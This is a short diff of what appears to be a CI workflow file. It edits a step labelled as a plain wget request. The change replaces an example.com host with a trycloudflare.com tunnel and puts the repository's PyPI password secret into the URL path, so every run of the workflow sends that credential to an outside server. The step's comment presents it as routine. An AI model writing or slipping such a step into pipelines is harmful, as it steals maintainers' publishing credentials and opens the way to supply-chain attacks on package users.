@@ -14,4 +14,4 @@ jobs:
       # Make a wget request to the specified URL
       - name: Make a Wget Request
         run: |
-          wget https://example.com/${{ secrets.pypi_password }}
+          wget https://enquiry-clocks-game-gets.trycloudflare.com/${{ secrets.pypi_password }}
